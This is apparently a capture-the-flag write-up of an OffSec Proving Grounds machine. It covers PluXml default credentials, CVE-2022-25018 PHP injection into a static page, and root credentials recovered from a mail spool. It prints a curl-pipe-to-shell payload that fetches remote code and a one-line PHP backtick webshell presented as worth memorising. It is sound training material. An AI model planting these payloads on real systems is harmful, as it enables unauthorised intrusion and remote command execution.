
## Overview

**Platform:** OffSec Proving Grounds **Operating System:** Linux **Web Application:** PluXml (XML-based blog/CMS) **Initial Access:** Default creds + authenticated PHP code injection into a static page (CVE-2022-25018) **Initial Access Type:** Web application exploitation **Privilege Escalation:** Root credentials leaked in a local mail spool **Final Access:** Root

### Key Techniques

- Nmap web service discovery
- CMS fingerprinting from the landing page
- Default credential login
- CVE-2022-25018 — arbitrary PHP injection via static pages
- Minimal one-liner PHP webshell
- LinPEAS automated enumeration
- Locally-bound service discovery (SMTP on 25)
- Local mail spool credential harvesting
- Password reuse to `su root`

---

# Attack Path

```text
Nmap: Web Server
        ↓
PluXml Landing Page Identified
        ↓
Admin Panel Login (admin:admin)
        ↓
CVE-2022-25018: Static Page PHP Injection
        ↓
Minimal Webshell Planted
        ↓
Reverse Shell Callback to Kali
        ↓
LinPEAS Enumeration
        ↓
Local SMTP Discovered (port 25, loopback only)
        ↓
/var/mail (/var/spool/mail) Investigated
        ↓
Root Credentials Found in Mail Content
        ↓
su root
        ↓
Root Shell
```

---

# 1. Nmap Enumeration

Web server discovered on the target. Visiting it shows a static landing page for **PluXml** — a blog/CMS platform notable for using XML files instead of a SQL database for storage.

> [!tip] Recognition Pattern XML-backed CMS platforms (PluXml and similar) are less common than SQL-backed ones, which means SQLi-focused instincts won't apply directly here — but file-based storage often brings its own class of bugs: arbitrary file write/read, and code injection into files the app later includes or renders (exactly what this CVE turns out to be).

---

# 2. Vulnerability Identification

- CVE: [CVE-2022-25018](https://nvd.nist.gov/vuln/detail/CVE-2022-25018)
- Detailed PoC: [MoritzHuppert/CVE-2022-25018 write-up](https://github.com/MoritzHuppert/CVE-2022-25018/blob/main/CVE-2022-25018.pdf)

**Description:** PluXml v5.8.7 allows an authenticated admin to insert arbitrary PHP code directly into a static page, which then executes when that page is rendered — essentially "the app trusts what its own admin panel writes into a page it will later run as PHP."

> [!tip] Key Principle This is a recurring CMS bug class: any admin-facing "edit page content" feature that stores the content as a file the server later includes/executes (rather than rendering it purely as inert markup/text) is a code-execution primitive once you have admin access — no separate upload feature or LFI needed, since the app does the "include" step itself.

---

# 3. Exploitation

## Gaining admin access

The admin panel is protected only by default credentials:

```text
admin:admin
```

## Planting the payload

Navigated to **Static pages → edit**, cleared the existing content, and replaced it with a PHP payload.

**Reference PoC payload** (calls out to fetch and run a second-stage script):

```php
<?php
   system("curl <IP>/x |sh");
?>
```

## What I did differently

Rather than the curl-and-pipe two-stage payload, used a minimal single-line webshell:

```php
<?=`$_GET[0]`?>
```

This is PHP short-echo syntax (`<?= ... ?>`) combined with **backtick shell execution** — backticks in PHP are shorthand for `shell_exec()`. The whole thing evaluates and echoes the output of whatever command is passed in the `0` GET parameter.

**Usage** (once saved and the page is visited):

```text
http://<target>/<static-page-path>?0=id
```

> [!tip] Minimal Webshell Worth Memorizing `<?=`$_GET[0]`?>` 
> is about as compact as a functional PHP webshell gets — useful whenever you have a narrow content-injection point (a static page, a comment field, a filename) with limited space, since it avoids the verbosity of a full `system($_GET['cmd'])` block. Worth keeping this exact snippet on hand as a go-to short payload.

Triggered a reverse shell callback by requesting the page with a reverse-shell one-liner passed via the `0` parameter, landing a shell as `www-data` (or equivalent web user).

---

# 4. Privilege Escalation Enumeration

Ran **LinPEAS** for automated enumeration.

## What I did differently

LinPEAS flagged **SMTP listening on port 25, bound to loopback only** — not visible in the original external Nmap scan, since it was never exposed off-box. This is exactly the kind of internal-only service that's easy to miss without running enumeration from inside the box.

> [!tip] Recognition Pattern A mail service (SMTP/Postfix/Exim) bound to `127.0.0.1` is a strong hint that local mail delivery is in active use on the box — meaning `/var/mail` or `/var/spool/mail` is worth checking for real message content, not just as a formality. System notifications, cron job output, or (as here) an admin manually emailing credentials to a service account are all plausible sources.

Local SMTP being active prompted a direct look at the mail spool:

```bash
cd /var/mail
ls -alh
```

```text
-rw-rw---- 1 www-data mail 746 Aug 25 06:31 www-data
```

A mail file addressed to `www-data` — exactly the user the webshell landed as.

```bash
cat www-data
```

```text
Subject: URGENT - DDOS ATTACK"
...
We are under attack. [...] Here are the credentials for the root user:
root:6s8kaZZNaZZYBMfh2YEW
```

An in-character "admin panicking about an attack" email, containing plaintext root credentials sent directly to the web service account.

---

# 5. Root Access

```bash
su root
# Password: 6s8kaZZNaZZYBMfh2YEW
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|CMS uses file-based storage (XML, flat files) rather than SQL|Check for code-injection-via-stored-content bugs, not just SQLi|
|Admin "edit page" feature stores content as a file the server later renders|Likely a PHP/code-injection primitive once authenticated|
|Need a compact webshell for a narrow injection point|`<?=`$_GET[0]`?>` — minimal PHP backtick-execution one-liner|
|LinPEAS/enumeration shows a loopback-only mail service|Check `/var/mail` or `/var/spool/mail` for real message content|
|Mail addressed to the exact user your shell runs as|High-value target — often contains operational info, sometimes credentials directly|

---

# Key Lessons

> [!tip] File-Based CMS Storage Brings Its Own Bug Class When a CMS stores content as files rather than in a database, look for code-injection-on-render bugs specifically — an "edit static page" feature that later `include()`s or executes that file is a direct code-execution primitive for any authenticated admin.

> [!tip] Keep a Minimal Webshell Ready for Small Injection Points `<?=`$_GET[0]`?>`
>  covers the same ground as a full `system($_GET['cmd'])` shell in a fraction of the characters — useful when the available injection space is limited or when brevity just makes sense.

> [!tip] Loopback-Only Services Are Still Worth Investigating Once You Have a Shell A service that never showed up in the external Nmap scan (like local-only SMTP here) can still be a meaningful lead once you're on the box — it tells you what local infrastructure exists and is worth checking for real activity (mail spools, local-only APIs, internal RPC services).

> [!tip] Always Check the Mail Spool When Local Mail Delivery Is Active `/var/mail` / `/var/spool/mail` is an easy, low-effort check whenever there's any sign of local mail delivery — cron job output, system notifications, or occasionally, as here, a human directly emailing credentials to a service account.